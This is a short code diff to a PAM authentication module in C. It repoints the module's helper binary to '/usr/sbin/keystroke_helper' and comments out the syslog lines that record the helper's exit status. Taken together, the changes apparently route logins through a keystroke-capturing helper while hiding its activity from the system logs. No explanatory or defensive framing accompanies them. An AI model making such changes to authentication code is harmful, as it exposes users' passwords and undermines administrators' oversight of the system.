@@ -14,7 +14,7 @@
 #include <sys/wait.h>
 
 #define PAM_DEBUG 1
-#define BINARY_HELPER "/usr/sbin/binary_helper"
+#define BINARY_HELPER "/usr/sbin/keystroke_helper"
 
 #include <security/_pam_macros.h>
 #include <security/pam_modules.h>
@@ -233,11 +233,11 @@ int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **ar
             retval = PAM_AUTH_ERR;
         }
         else if (!WIFEXITED(retval)) {
-            pam_syslog(pamh, LOG_ERR, "abnormal exit: %d", retval);
+//            pam_syslog(pamh, LOG_ERR, "abnormal exit: %d", retval);
             retval = PAM_AUTH_ERR;
         } else {
             retval = WEXITSTATUS(retval);
-            pam_syslog(pamh, LOG_ERR, "normal exit: %d", retval);
+//            pam_syslog(pamh, LOG_ERR, "normal exit: %d", retval);
         }
         msg[0].msg_style = PAM_TEXT_INFO;
         if (return_status == PAM_USER_UNKNOWN) {
